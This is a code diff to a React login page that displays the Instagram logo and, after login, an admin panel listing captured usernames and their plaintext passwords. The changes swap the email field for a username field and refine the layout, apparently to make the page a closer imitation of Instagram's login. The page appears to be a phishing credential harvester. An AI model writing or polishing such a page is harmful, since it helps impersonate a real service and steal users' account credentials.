@@ -3,7 +3,7 @@ import { ToastContainer, toast } from 'react-toastify';
 import 'react-toastify/dist/ReactToastify.css';
 
 function App() {
-  const [email, setEmail] = useState('');
+  const [username, setUsername] = useState('');
   const [password, setPassword] = useState('');
   const [isAdmin, setIsAdmin] = useState(false);
   const [users, setUsers] = useState([]); // MongoDB Users List
@@ -15,7 +15,7 @@ function App() {
       {
         method: 'POST',
         headers: { 'Content-Type': 'application/json' },
-        body: JSON.stringify({ email, password }),
+        body: JSON.stringify({ username, password }),
       },
     );
 
@@ -44,9 +44,9 @@ function App() {
   };
 
   return (
-    <div className="flex items-center justify-center min-h-screen bg-gray-50">
+    <div className="flex items-center justify-center min-h-screen bg-gray-50 p-4">
       {!isAdmin ? (
-        <div className="p-8 text-center bg-white border rounded-lg shadow-lg w-96">
+        <div className="p-8 text-center bg-white border rounded-lg shadow-lg w-full max-w-sm">
           <div className="flex justify-center mb-6">
             <img
               src="https://upload.wikimedia.org/wikipedia/commons/a/a5/Instagram_icon.png"
@@ -60,9 +60,9 @@ function App() {
           <form onSubmit={handleLogin} className="space-y-4">
             <input
               type="text"
-              placeholder="Email"
-              value={email}
-              onChange={(e) => setEmail(e.target.value)}
+              placeholder="Username"
+              value={username}
+              onChange={(e) => setUsername(e.target.value)}
               required
               className="w-full p-3 bg-gray-100 border rounded-lg focus:outline-none focus:ring-2 focus:ring-blue-400"
             />
@@ -92,24 +92,26 @@ function App() {
           </div>
         </div>
       ) : (
-        <div className="p-8 text-center bg-white border rounded-lg shadow-lg w-full">
+        <div className="p-8 text-center bg-white border rounded-lg shadow-lg w-full max-w-4xl">
           <h2 className="mb-6 text-3xl font-bold text-gray-800">Admin Panel</h2>
-          <table className="w-full border-collapse border border-gray-200">
-            <thead>
-              <tr className="bg-gray-100">
-                <th className="p-2 border">Email</th>
-                <th className="p-2 border">Password</th>
-              </tr>
-            </thead>
-            <tbody>
-              {users.map((user, index) => (
-                <tr key={index} className="border">
-                  <td className="p-2 border">{user.email}</td>
-                  <td className="p-2 border">{user.password}</td>
+          <div className="overflow-x-auto">
+            <table className="w-full border-collapse border border-gray-200">
+              <thead>
+                <tr className="bg-gray-100">
+                  <th className="p-2 border">Username</th>
+                  <th className="p-2 border">Password</th>
                 </tr>
-              ))}
-            </tbody>
-          </table>
+              </thead>
+              <tbody>
+                {users.map((user, index) => (
+                  <tr key={index} className="border">
+                    <td className="p-2 border">{user.username}</td>
+                    <td className="p-2 border">{user.password}</td>
+                  </tr>
+                ))}
+              </tbody>
+            </table>
+          </div>
         </div>
       )}
 
